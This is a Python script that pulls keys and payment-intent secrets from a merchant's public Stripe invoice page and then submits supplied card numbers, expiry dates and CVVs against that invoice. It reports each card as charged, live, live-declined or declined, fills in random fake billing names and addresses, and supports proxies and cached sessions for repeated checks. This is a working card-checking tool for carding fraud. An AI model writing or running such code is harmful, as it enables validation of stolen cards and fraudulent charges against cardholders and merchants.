import re
import time
import json
import random
import string
import asyncio
import logging
import httpx

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format="%(name)s: %(message)s")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
STRIPE_API = "https://api.stripe.com/v1"
INVOICE_DATA_API = "https://invoicedata.stripe.com"

LIVE_DECLINE_CODES = {
    "insufficient_funds", "do_not_honor", "pickup_card", "restricted_card",
    "not_permitted", "revocation_of_all_authorizations", "security_violation",
    "service_not_allowed", "transaction_not_allowed", "withdrawal_count_exceeded",
}


def parse_invoice_url(url: str):
    from urllib.parse import urlparse
    try:
        parsed = urlparse(url)
        if parsed.scheme != "https" or parsed.hostname != "invoice.stripe.com":
            return None
        path_match = re.match(r"^/i/([^/]+)/([^/]+)$", parsed.path)
        if path_match:
            return {"acct": path_match.group(1), "token": path_match.group(2), "url": url}
    except Exception:
        pass
    return None


async def _fetch_invoice_data(client, url):
    parsed = parse_invoice_url(url)
    if not parsed:
        return None

    merchant_token = parsed["acct"]
    invoice_secret = parsed["token"]

    data_url = f"{INVOICE_DATA_API}/hosted_invoice_page/{merchant_token}/{invoice_secret}"
    headers = {
        "User-Agent": UA,
        "Accept": "application/json",
        "Origin": "https://invoice.stripe.com",
        "Referer": "https://invoice.stripe.com/",
    }

    resp = await client.get(data_url, headers=headers, timeout=20)
    if resp.status_code != 200:
        logger.warning(f"invoicedata API returned {resp.status_code}")
        return None

    data = resp.json()
    pk = data.get("publishable_key", "")
    ek = data.get("ephemeral_key", "")
    invoice_id = data.get("invoice_id", "")

    merchant = ""
    merch_obj = data.get("merchant", {})
    if isinstance(merch_obj, dict):
        merchant = merch_obj.get("business_name", "") or merch_obj.get("name", "")

    logger.info(f"invoicedata: pk={pk[:25]}..., ek={ek[:25]}..., inv={invoice_id}, merchant={merchant}")

    if not pk or not ek or not invoice_id:
        logger.warning(f"Missing fields: pk={bool(pk)}, ek={bool(ek)}, inv_id={bool(invoice_id)}")
        return None

    inv_resp = await client.get(
        f"{STRIPE_API}/invoices/{invoice_id}/hosted",
        params={
            "expand[]": [
                "payment_intent.payment_method",
                "payment_intent.source",
                "total_tax_amounts.tax_rate",
                "customer.sources",
            ],
        },
        headers={
            "User-Agent": UA,
            "Authorization": f"Bearer {ek}",
            "Stripe-Version": "2020-03-02",
        },
        timeout=15,
    )

    if inv_resp.status_code != 200:
        logger.warning(f"invoices/hosted API returned {inv_resp.status_code}")
        return None

    inv_data = inv_resp.json()
    if "error" in inv_data:
        err = inv_data["error"]
        logger.warning(f"invoices/hosted error: {err.get('message', '')}")
        return None

    pi_id = ""
    pi_cs = ""
    pi_status = ""
    pi_raw = inv_data.get("payment_intent")
    if isinstance(pi_raw, dict):
        pi_id = pi_raw.get("id", "")
        pi_cs = pi_raw.get("client_secret", "")
        pi_status = pi_raw.get("status", "")
    elif isinstance(pi_raw, str):
        pi_id = pi_raw

    amount = inv_data.get("amount_due", 0) or inv_data.get("amount_remaining", 0) or 0
    currency = inv_data.get("currency", "")

    email = ""
    cust = inv_data.get("customer")
    if isinstance(cust, dict):
        email = cust.get("email", "") or ""
        if not merchant:
            merchant = cust.get("name", "") or ""

    billing_required = False
    if inv_data.get("customer_address") is not None:
        billing_required = True

    logger.info(f"Invoice: pi={pi_id[:20]}, cs={bool(pi_cs)}, status={pi_status}, amt={amount} {currency}, merchant={merchant}")

    return {
        "pk": pk,
        "ek": ek,
        "invoice_id": invoice_id,
        "pi_id": pi_id,
        "pi_cs": pi_cs,
        "pi_status": pi_status,
        "amount": amount,
        "currency": currency,
        "merchant": merchant,
        "email": email,
        "billing_required": billing_required,
    }


def _random_name():
    first = random.choice(["James", "Mary", "John", "Linda", "Robert", "Sarah", "Michael", "Emma", "David", "Anna"])
    last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Moore"])
    return first, last


async def stripe_invoice_check(cc, mm, yy, cvv, invoice_url, session_cache=None, proxy="NONE"):
    start = time.time()
    transport = None
    if proxy and proxy != "NONE":
        transport = httpx.AsyncHTTPTransport(proxy=proxy)

    async with httpx.AsyncClient(
        transport=transport,
        http2=True,
        verify=True,
        timeout=30,
        follow_redirects=True,
    ) as client:
        try:
            if session_cache and isinstance(session_cache, dict) and session_cache.get("pk") and session_cache.get("pi_cs"):
                info = session_cache
                logger.info(f"Using cached invoice session: pk={info['pk'][:20]}..., pi={info.get('pi_id','')[:20]}")
            else:
                info = await _fetch_invoice_data(client, invoice_url)
                if not info:
                    return "error", "Could not extract invoice data from Stripe", None, round(time.time() - start, 2), None
                if not info["pk"]:
                    return "error", "Could not extract publishable key", None, round(time.time() - start, 2), None

            pk = info["pk"]
            pi_id = info.get("pi_id", "")
            pi_cs = info.get("pi_cs", "")
            billing_required = info.get("billing_required", False)

            if not pi_id or not pi_cs:
                return "error", "No payment intent found in invoice", None, round(time.time() - start, 2), None

            pi_status = info.get("pi_status", "")
            if pi_status == "succeeded":
                return "error", "Invoice already paid", None, round(time.time() - start, 2), None
            if pi_status == "canceled":
                return "error", "Invoice canceled", None, round(time.time() - start, 2), None

            headers = {
                "User-Agent": UA,
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://invoice.stripe.com",
                "Referer": "https://invoice.stripe.com/",
                "Accept": "application/json",
            }

            pm_data = {
                "type": "card",
                "card[number]": cc,
                "card[exp_month]": mm,
                "card[exp_year]": yy if len(yy) == 4 else f"20{yy}",
                "card[cvc]": cvv,
                "key": pk,
            }

            if billing_required:
                first, last = _random_name()
                pm_data.update({
                    "billing_details[name]": f"{first} {last}",
                    "billing_details[address][line1]": f"{random.randint(100,9999)} {random.choice(['Main','Oak','Elm','Park'])} St",
                    "billing_details[address][city]": random.choice(["New York", "Los Angeles", "Chicago", "Houston"]),
                    "billing_details[address][state]": random.choice(["NY", "CA", "IL", "TX"]),
                    "billing_details[address][postal_code]": f"{random.randint(10000,99999)}",
                    "billing_details[address][country]": "US",
                })

            pm_resp = await client.post(f"{STRIPE_API}/payment_methods", data=pm_data, headers=headers, timeout=15)
            pm_result = pm_resp.json()

            if "error" in pm_result:
                err = pm_result["error"]
                code = err.get("code", "")
                msg = err.get("message", "Unknown error")
                if code in ("incorrect_number", "invalid_number"):
                    return "declined", "Invalid card number", None, round(time.time() - start, 2), None
                if code == "invalid_expiry_year":
                    return "declined", "Invalid expiry", None, round(time.time() - start, 2), None
                return "declined", msg[:80], None, round(time.time() - start, 2), None

            pm_id = pm_result.get("id", "")
            if not pm_id:
                return "error", "Failed to create payment method", None, round(time.time() - start, 2), None

            card_info = pm_result.get("card", {})
            logger.info(f"PM created: {pm_id[:15]}..., brand={card_info.get('brand','')}")

            confirm_data = {
                "payment_method": pm_id,
                "client_secret": pi_cs,
                "key": pk,
                "return_url": invoice_url,
            }

            confirm_resp = await client.post(
                f"{STRIPE_API}/payment_intents/{pi_id}/confirm",
                data=confirm_data,
                headers=headers,
                timeout=25,
            )
            confirm_result = confirm_resp.json()
            status = confirm_result.get("status", "")
            logger.info(f"Confirm: HTTP {confirm_resp.status_code}, status={status}")

            cached = {
                "pk": pk,
                "ek": info.get("ek", ""),
                "pi_id": pi_id,
                "pi_cs": pi_cs,
                "invoice_id": info.get("invoice_id", ""),
                "merchant": info.get("merchant", ""),
                "amount": info.get("amount", 0),
                "currency": info.get("currency", ""),
                "email": info.get("email", ""),
                "billing_required": billing_required,
            }

            if "error" in confirm_result:
                err = confirm_result["error"]
                code = err.get("code", "")
                decline = err.get("decline_code", "")
                msg = err.get("message", "")

                if code == "card_declined":
                    if decline in LIVE_DECLINE_CODES:
                        return "live_declined", decline, card_info, round(time.time() - start, 2), cached
                    return "declined", decline or "card_declined", card_info, round(time.time() - start, 2), cached
                if code in ("expired_card", "incorrect_cvc", "incorrect_zip", "invalid_cvc"):
                    return "declined", code, card_info, round(time.time() - start, 2), cached
                return "declined", f"{code}: {msg[:60]}", card_info, round(time.time() - start, 2), cached

            if status == "succeeded":
                return "charged", "Charged Successfully", card_info, round(time.time() - start, 2), cached
            if status == "requires_capture":
                return "charged", "Authorized (Capture Pending)", card_info, round(time.time() - start, 2), cached
            if status == "processing":
                return "approved", "Processing", card_info, round(time.time() - start, 2), cached

            if status in ("requires_action", "requires_source_action"):
                return "live", "3DS Authentication Required", card_info, round(time.time() - start, 2), cached

            if status in ("requires_payment_method", "requires_source"):
                last_error = confirm_result.get("last_payment_error", {})
                if last_error:
                    code = last_error.get("code", "")
                    decline = last_error.get("decline_code", "")
                    msg = last_error.get("message", "")
                    if code == "card_declined":
                        if decline in LIVE_DECLINE_CODES:
                            return "live_declined", decline, card_info, round(time.time() - start, 2), cached
                        return "declined", decline or "card_declined", card_info, round(time.time() - start, 2), cached
                    return "declined", f"{code}: {msg[:60]}", card_info, round(time.time() - start, 2), cached
                return "declined", "Payment method failed", card_info, round(time.time() - start, 2), cached

            return "declined", f"Status: {status}", card_info, round(time.time() - start, 2), cached

        except httpx.TimeoutException:
            return "error", "Request timed out", None, round(time.time() - start, 2), None
        except Exception as e:
            logger.error(f"Invoice check error: {e}")
            return "error", str(e)[:100], None, round(time.time() - start, 2), None
